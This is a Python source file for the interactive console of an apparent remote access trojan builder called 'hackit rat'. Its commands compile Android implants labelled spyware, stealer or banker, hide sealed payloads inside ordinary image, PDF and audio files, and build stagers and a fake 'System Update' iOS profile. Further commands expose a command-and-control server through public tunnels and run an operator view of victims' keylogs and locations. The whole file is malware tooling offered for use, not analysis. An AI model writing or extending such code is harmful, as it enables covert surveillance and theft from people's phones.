"""Bare `hackit rat` surface: banner, status, then a verb loop with no flags.

The loop is the product: `make app`, `make file`, `inject`, `run`. Anything
typed that is not a verb is treated as a verb argument, so `make app` and
`make app myapp malware` both work without a parser. Layout is fixed-width so
columns never drift, and every long value is truncated to the pane instead of
wrapping over its neighbour.
"""
from __future__ import annotations

import json
import os
import re
from typing import List, Optional

from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_WHITE, DIM, GREEN

from . import builder, ios, polyglot, samples, sdk, server, store, term, ui

BANNER = "\n".join(
    [
        _colored("                 ______", B_WHITE),
        _colored("              .-\"      \"-.", B_WHITE),
        _colored("             /            \\", B_WHITE),
        _colored("            |              |", B_WHITE),
        _colored("            |,  .-.  .-.  ,|", B_WHITE),
        _colored("            | )(_O/  \\O_)( |", B_WHITE),
        _colored("            |/     /\\     \\|", B_WHITE),
        _colored("    .-~~~-. (_     ^^     _) .-~~~-.", B_MAGENTA),
        _colored("   /  *    \\ \\__|IIIIII|__/ /    *  \\", B_MAGENTA),
        _colored("   |   .    |/  \\IIIIII/  \\|    .   |", B_MAGENTA),
        _colored("    \\  '   / |   ", B_MAGENTA)
        + _colored("HACKIT", B_GREEN)
        + _colored("   | \\   '  /", B_MAGENTA),
        _colored("     '-..-'   \\    ", B_MAGENTA)
        + _colored("RAT", B_GREEN)
        + _colored("   /   '-..-'", B_MAGENTA),
        _colored("         .      '._______.'      .", B_MAGENTA),
        _colored("        /|\\       /  |  \\       /|\\", B_MAGENTA),
        _colored("       / | \\     /   |   \\     / | \\", B_MAGENTA),
        _colored("      *  |  *   '    |    '   *  |  *", B_MAGENTA),
        _colored("                  v i r u s", B_MAGENTA),
        _colored("   android · ios · native · carriers · 21 file formats", B_CYAN),
        _colored("   type `help` · `run` opens the live UI", DIM),
    ]
)

# (section, [(verb, description)]). Verbs stay typeable verbatim; the index is
# only a shortcut so the rail reads as a menu instead of a wall.
MENU: List[tuple] = [
    ("BUILD", [
        ("1", "make app <name> [spec]", "compile a signed APK (auto-installs the SDK)"),
        ("2", "make installer [spec]", "offline USB installer: APK + setup.bat + setup.sh"),
        ("3", "make file <ext> [carrier]", "hide the APK in one carrier format"),
        ("4", "make stager [host]", "installer + landing page + iOS profile"),
        ("5", "make ios [url]", "WebClip profile + PWA link for iPhone"),
    ]),
    ("INJECT", [
        ("6", "inject <spec> <file>", "hide a sealed payload in that file (jpg/pdf/mp3/…/apk)"),
    ]),
    ("OPERATE", [
        ("7", "run", "live operator UI (devices, feed, keylog, location)"),
        ("8", "tunnel [provider]", "expose the C2 publicly (cloudflared/ngrok/ssh)"),
        ("9", "sessions", "list known devices"),
    ]),
    ("SYSTEM", [
        ("d", "doctor", "toolchain readiness"),
        ("i", "setup", "install the SDK + build-tools (once)"),
        ("?", "help / clear / quit", "this list / clear screen / leave"),
    ]),
]

SHORTCUTS = {
    "1": "make app agent rat",
    "2": "make installer",
    "3": "make file",
    "4": "make stager",
    "5": "make ios",
    "6": "inject",
    "7": "run",
    "8": "tunnel",
    "9": "sessions",
    "0": "help",
    "d": "doctor",
    "i": "setup",
}

SPECS = "rat · trojan · spyware · malware · stealer · banker · bot · minimal"
CONFIG_PATH = os.path.join(store.ROOT, "agent.json")
MAX_NAME = 48


def _host_from_config() -> Optional[str]:
    try:
        with open(CONFIG_PATH, "r", encoding="utf-8") as handle:
            return json.load(handle).get("host")
    except (OSError, ValueError):
        return None


def _ensure_config(spec: str = "rat") -> dict:
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r", encoding="utf-8") as handle:
                existing = json.load(handle)
            current = existing.setdefault("spec", "rat")
            desired = spec if spec != "rat" else current
            modules = sorted(set(builder.CORE_MODULES + builder.SPECS[desired]))
            if current != desired or existing.get("modules") != modules:
                existing["spec"] = desired
                existing["modules"] = modules
                with open(CONFIG_PATH, "w", encoding="utf-8") as handle:
                    json.dump(existing, handle, indent=2)
            return existing
        except (OSError, ValueError):
            pass
    print(term.Dim + "  no config yet — two fields, then it stops asking." + term.RESET)
    lan = builder.detect_lan()
    host = input(_colored(f"  C2 host [auto → http://{lan}:8443]: ", B_GREEN)).strip() or "auto"
    label = input(_colored("  implant label [android]: ", B_GREEN)).strip() or "android"
    config = builder.make_config(host, _psk_b64(), label, 60000, True, "", spec)
    print(term.label("resolved", 11) + term.Bright + str(config["host"]) + term.RESET)
    os.makedirs(os.path.dirname(CONFIG_PATH), exist_ok=True)
    with open(CONFIG_PATH, "w", encoding="utf-8") as handle:
        json.dump(config, handle, indent=2)
    os.chmod(CONFIG_PATH, 0o600)
    print(term.label("config", 11) + term.Dim + CONFIG_PATH + term.RESET)
    return config


def _psk_b64() -> str:
    import base64

    return base64.b64encode(server.load_psk(store.ROOT + "/psk.txt")
                            if os.path.exists(store.ROOT + "/psk.txt")
                            else server.write_psk(store.ROOT + "/psk.txt")).decode("ascii")


def _latest_apk() -> Optional[str]:
    root = os.path.join(store.ROOT, "build")
    if not os.path.isdir(root):
        return None
    candidates = []
    for base, _dirs, names in os.walk(root):
        for name in names:
            if name.endswith(".apk"):
                path = os.path.join(base, name)
                candidates.append((os.path.getmtime(path), path))
    return max(candidates)[1] if candidates else None


def _safe_name(name: str) -> str:
    clean = re.sub(r"[^A-Za-z0-9._-]", "-", name.strip())
    return clean or "agent"


def _build_apk(name: str = "agent", spec: str = "rat") -> str:
    spec = (spec or "rat").lower()
    if spec not in builder.SPECS:
        print(term.Bad + f"  unknown spec {spec!r} — choose {SPECS}" + term.RESET)
        spec = "rat"
    name = _safe_name(name)[:MAX_NAME]
    config = _ensure_config(spec)
    out = os.path.join(store.ROOT, "dist", name if name.endswith(".apk") else name + ".apk")
    print()
    print(term.Title + "  BUILD" + term.RESET)
    print(term.label("spec", 11) + term.Bright + spec + term.RESET)
    print(term.label("label", 11) + term.Bright + str(config.get("label", "android")) + term.RESET)
    print(term.label("host", 11) + term.Dim + str(config.get("host", "")) + term.RESET)
    print(term.label("toolchain", 11) + term.Dim
          + ("ready" if sdk.find() else "absent — installing automatically") + term.RESET)
    path = builder.build(config, engine="auto", release=True, out=out)
    size = os.path.getsize(path)
    print()
    for line in term.box(
        "APK READY",
        [
            term.Green if False else term.Good + "  " + os.path.basename(path) + term.RESET,
            term.Dim + f"  {size:,} bytes · spec {spec}" + term.RESET,
            term.Dim + "  adb install -r " + path + term.RESET,
        ],
        64,
        term.Good,
    ):
        print("  " + line)
    return path


def _resolve_carrier(target: str) -> Optional[str]:
    target = target.strip("\"'")
    if not target:
        return None
    if os.path.isabs(target):
        return target if os.path.isfile(target) else None
    for base in (os.getcwd(),
                 os.path.expanduser("~"),
                 os.path.expanduser("~/Pictures"),
                 os.path.expanduser("~/Downloads"),
                 os.path.expanduser("~/Documents"),
                 os.path.join(store.ROOT, "dist")):
        candidate = os.path.join(base, target)
        if os.path.isfile(candidate):
            return candidate
    return None


def _verify_carrier(result) -> bool:
    """Container still parses AND the payload carves back byte-identical."""
    from hashlib import sha256

    report = polyglot.verify(result.carrier)
    data = open(result.carrier, "rb").read()
    blob = polyglot.carve(data, result.start or polyglot.START)
    if result.sealed:
        blob = polyglot.open_payload(blob, bytes.fromhex(result.key))
    ok = bool(report.get("ok")) and sha256(blob).hexdigest() == result.digest
    print(term.label("verified", 11) + (term.Good + "carrier intact · payload byte-identical"
                                        if ok else term.Bad + "VERIFY FAILED") + term.RESET)
    return ok


def _inject(first: str, second: str = "") -> None:
    """inject <file> [spec] — also accepts the old <spec> <file> order."""
    target, spec = (first, second)
    if first.lower() in builder.SPECS and second:
        spec, target = first, second
    spec = (spec or _config_spec()).lower()
    if spec not in builder.SPECS:
        spec = "rat"
    target = target.strip("\"'")
    ext = os.path.splitext(target)[1].lower().lstrip(".")
    if ext not in polyglot.MODES:
        print(term.Warn + f"  no carrier recipe for .{ext or '?'} — "
              + ", ".join(sorted(polyglot.MODES)) + term.RESET)
        return
    source = _resolve_carrier(target)
    if not source:
        print(term.Bad + f"  carrier not found: {target}" + term.RESET)
        return
    apk = _latest_apk() or _build_apk("agent", spec)
    folder = os.path.join(store.ROOT, "dist", spec)
    os.makedirs(folder, exist_ok=True)
    print(term.label("carrier", 11) + term.Dim + source + term.RESET)
    print(term.label("real", 11) + term.Dim
          + f"{os.path.getsize(source):,} bytes preserved" + term.RESET)
    result = polyglot.build(source, apk, out_dir=folder, encrypt=True)
    print(term.label("spec", 11) + term.Bright + spec + term.RESET)
    print(term.label("output", 11) + term.Good + result.carrier + term.RESET)
    print(term.label("sealed", 11) + term.Dim + f"{result.size:,} bytes · sha256 {result.digest[:16]}…"
          + term.RESET)
    _verify_carrier(result)
    for path in result.launchers:
        print(term.label("helper", 11) + term.Dim + path + term.RESET)


def _config_spec() -> str:
    try:
        return str(json.loads(open(CONFIG_PATH, encoding="utf-8").read()).get("spec") or "rat")
    except (OSError, ValueError):
        return "rat"


def _make_file(ext: str, carrier: Optional[str], name: str) -> None:
    apk = _latest_apk()
    if not apk:
        print(term.Dim + "  no APK yet — building one first" + term.RESET)
        apk = _build_apk("agent")
    folder = os.path.join(store.ROOT, "dist")
    os.makedirs(folder, exist_ok=True)
    if carrier and os.path.isfile(carrier):
        source = carrier
    else:
        source = samples.sample(ext, folder)
        print(term.label("sample", 11) + term.Dim + source + term.RESET)
    result = polyglot.build(source, apk, out_dir=folder, encrypt=True)
    print(term.label("carrier", 11) + term.Good + result.carrier + term.RESET)
    print(term.label("payload", 11) + term.Dim + f"{result.size:,} bytes · sha256 {result.digest[:16]}…"
          + term.RESET)
    _verify_carrier(result)
    for path in result.launchers:
        print(term.label("helper", 11) + term.Dim + path + term.RESET)


def _make_installer(spec: str, label: str) -> None:
    from . import installer
    apk = _latest_apk()
    if not apk:
        apk = _build_apk("agent", spec)
    config = _ensure_config(spec)
    folder = os.path.join(store.ROOT, "dist", f"installer-{installer.stamp()}")
    made = installer.build(apk, folder, spec, label or config.get("label", "agent"))
    for path in made:
        print(term.label("file", 11) + term.Good + path + term.RESET)


def _make_stager(host: Optional[str]) -> None:
    from . import stager

    config = _ensure_config()
    target = host or config["host"]
    out = stager.build(target, config, os.path.join(store.ROOT, "dist"))
    for path in out:
        print(term.label("file", 11) + term.Good + path + term.RESET)


def _make_ios(url: Optional[str]) -> None:
    config = _ensure_config()
    base = url or config["host"].rstrip("/")
    folder = os.path.join(store.ROOT, "dist")
    os.makedirs(folder, exist_ok=True)
    path = ios.write_profile(folder, "System Update", base + "/w/" + _web_token())
    print(term.label("profile", 11) + term.Good + path + term.RESET)
    print(term.label("open", 11) + term.Dim + f"{base}/w/{_web_token()}/ once to register the PWA"
          + term.RESET)


def _web_token() -> str:
    path = os.path.join(store.ROOT, "webtoken")
    if os.path.exists(path):
        return open(path, encoding="utf-8").read().strip()
    token = os.urandom(9).hex()
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(token)
    return token


def _print_sessions() -> None:
    store.init()
    rows = store.sessions()
    if not rows:
        print(term.Dim + "  no devices yet — `make app`, install it, open once" + term.RESET)
        return
    width, _ = term.size()
    columns = [3, 2, 8, 20, 22, 12]
    table_rows = []
    for index, row in enumerate(rows, 1):
        dot = _colored("●", GREEN) if row["online"] else _colored("○", DIM)
        table_rows.append([
            f"{index:>2}",
            dot,
            (row.get("spec") or "rat")[:8],
            (row.get("model") or "?")[:20],
            (row.get("sid") or "")[:22],
            f"{row.get('battery') or 0}%{'⚡' if row.get('charging') else ''}",
        ])
    for line in term.table(("#", "", "spec", "model", "sid", "batt"), table_rows, columns,
                           ["right", "center", "left", "left", "left", "right"]):
        print("  " + term.trunc(line, width - 2))


def _status_panel() -> List[str]:
    width, _ = term.size()
    inner = min(width - 4, 78)
    sessions = 0
    online = 0
    apks = 0
    try:
        store.init()
        rows = store.sessions()
        sessions = len(rows)
        online = sum(1 for row in rows if row["online"])
        apks = sum(1 for base, _d, names in os.walk(os.path.join(store.ROOT, "build"))
                   for name in names if name.endswith(".apk"))
    except Exception:
        pass
    config = {}
    try:
        config = json.loads(open(CONFIG_PATH, encoding="utf-8").read())
    except (OSError, ValueError):
        pass
    found = sdk.find()
    java = sdk.java_bin("javac")
    sdk_state = (term.Good + "ready" + term.RESET) if found else (
        term.Bad + "missing" + term.RESET
    )
    java_state = (term.Good + "ok" + term.RESET) if java else (term.Bad + "missing" + term.RESET)
    host = term.trunc(str(config.get("host") or "—"), inner - 16)
    spec = str(config.get("spec") or "rat")
    label_col = 8
    rows = [
        term.label("host", label_col) + term.Bright + host + term.RESET,
        term.label("spec", label_col) + term.Bright + spec + term.RESET,
        term.label("builds", label_col) + term.Dim + f"{apks} apk" + term.RESET,
        term.label("devices", label_col) + term.Dim + f"{online} online / {sessions} known"
        + term.RESET,
        term.label("sdk", label_col) + sdk_state + term.Dim + f"   javac {java_state}"
        + term.RESET,
    ]
    return term.box("BENCH", rows, inner, term.Frame)


def _print_menu() -> None:
    width, _ = term.size()
    for section, rows in MENU:
        print()
        print("  " + term.Title + section + term.RESET)
        for key, verb, desc in rows:
            print("  " + term.Dim + key.rjust(2) + term.RESET + "  "
                  + term.pad(verb, 28) + term.trunc(desc, max(10, width - 40)))
    print()
    print("  " + term.Dim + term.trunc(f"specs: {SPECS}", width - 4) + term.RESET)


def _doctor() -> int:
    print()
    print("  " + term.Title + "TOOLCHAIN" + term.RESET)
    return builder.doctor()


def _setup() -> int:
    print()
    print("  " + term.Title + "TOOLCHAIN INSTALL" + term.RESET)
    try:
        root = sdk.ensure()
    except sdk.SdkError as exc:
        print(term.Bad + f"  [x] {exc}" + term.RESET)
        return 1
    print(term.Good + f"  [ok] {root}" + term.RESET)
    return 0


def _history() -> None:
    try:
        import readline
    except ImportError:
        return
    readline.set_history_length(500)


def _prompt() -> str:
    return _colored("rat> ", B_GREEN)


def interactive() -> None:
    store.init()
    _history()
    term.clear()
    print(BANNER)
    print()
    for line in _status_panel():
        print("  " + line)
    if not os.path.exists(CONFIG_PATH):
        print(term.Dim + "  first run: host + PSK will be minted on the first build" + term.RESET)
    _print_menu()
    while True:
        try:
            line = input(_prompt()).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if not line:
            continue
        line = SHORTCUTS.get(line, line)
        parts = line.split()
        verb = parts[0].lower()
        args = parts[1:]
        try:
            if verb in ("quit", "exit", "q"):
                return
            if verb in ("help", "?", "menu"):
                print()
                for panel in _status_panel():
                    print("  " + panel)
                _print_menu()
            elif verb == "clear":
                term.clear()
                print(BANNER)
                _print_menu()
            elif verb == "sessions":
                print()
                _print_sessions()
            elif verb == "doctor":
                _doctor()
            elif verb == "setup":
                _setup()
            elif verb == "tunnel":
                from . import tunnel

                port = int(args[1]) if len(args) > 1 and args[1].isdigit() else 8443
                url = tunnel.start(port, args[0] if args and not args[0].isdigit() else "auto")
                if not url:
                    print(term.Warn + "  no tunnel available — install cloudflared or ngrok"
                          + term.RESET)
                else:
                    print(term.label("url", 11) + term.Good + url + term.RESET)
            elif verb == "run":
                key = server.load_psk(os.path.join(store.ROOT, "psk.txt"))
                ui.run("0.0.0.0", 8443, key, _host_from_config() or "http://127.0.0.1:8443")
            elif verb == "inject":
                if len(args) < 1:
                    print(term.Warn + "  inject <spec> <file>" + term.RESET)
                else:
                    _inject(args[0], args[1] if len(args) > 1 else "")
            elif verb == "make":
                what = (args[0] if args else "").lower()
                if what in ("apk", "app"):
                    _build_apk(args[1] if len(args) > 1 else "agent",
                               args[2] if len(args) > 2 else "rat")
                elif what == "installer":
                    _make_installer(args[1] if len(args) > 1 else "rat", "agent")
                elif what == "file":
                    ext = (args[1] if len(args) > 1 else "").lower().lstrip(".")
                    if ext not in polyglot.MAGICS:
                        print(term.Warn + f"  choose: {', '.join(polyglot.MAGICS)}" + term.RESET)
                        continue
                    _make_file(ext, args[2] if len(args) > 2 else None,
                               args[3] if len(args) > 3 else "agent")
                elif what == "stager":
                    _make_stager(args[1] if len(args) > 1 else None)
                elif what == "ios":
                    _make_ios(args[1] if len(args) > 1 else None)
                else:
                    print(term.Warn + "  make app | make file <ext> | make stager | make ios"
                          + term.RESET)
            else:
                print(term.Warn + f"  unknown: {verb} — help" + term.RESET)
        except SystemExit:
            raise
        except KeyboardInterrupt:
            print()
        except Exception as exc:
            print(term.Bad + f"  error: {exc}" + term.RESET)
